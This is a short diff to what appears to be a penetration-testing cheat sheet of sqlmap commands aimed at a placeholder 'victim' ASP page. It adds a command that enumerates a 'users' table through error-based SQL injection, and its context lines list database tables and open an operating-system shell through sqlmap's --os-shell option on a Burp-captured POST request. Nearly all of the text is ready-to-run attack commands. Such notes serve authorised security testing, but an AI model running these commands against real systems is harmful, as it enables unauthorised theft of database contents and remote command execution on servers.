@@ -481,6 +481,9 @@ sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --d
 # Table listing(technique: error based sqli)
 sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -D WEBDB --tables --batch
 
+# Table enumeration
+sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -T users --threads=10 --batch
+
 
 # Intercepting the POST request with Burp, Running sqlmap with os-shell
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
